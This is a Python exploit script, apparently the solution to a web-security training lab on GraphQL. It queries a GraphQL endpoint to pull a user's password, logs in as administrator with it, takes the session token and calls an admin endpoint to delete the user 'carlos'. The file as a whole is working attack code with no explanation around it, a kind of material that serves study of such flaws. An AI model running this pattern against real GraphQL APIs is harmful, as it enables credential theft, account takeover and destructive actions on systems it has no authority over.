import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
query_url = burp_url + '/graphql/v1'
answer_url = burp_url + '/admin/delete?username=carlos'

burp_headers = {"Content-Type": "application/json"}
burp_json={"query": "query login{getUser(id:1){  password username}}", "variables": {}}
response = requests.post(query_url, headers=burp_headers, json=burp_json)
match = re.search(r'[a-z0-9]{20}', response.text)
password = match.group(0)
print(password)
burp0_json = {
        "operationName": "login",
        "query": "\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }",
        "variables": {"input": {"password": password, "username": "administrator"}}
    }
session = requests.Session()
response = session.post(query_url, headers=burp_headers, json=burp0_json)
match = re.search(r'[a-zA-Z0-9]{32}', response.text)
token  = match.group(0)
cookie = {'session': token}
requests.get(answer_url,headers=burp_headers,cookies=cookie)
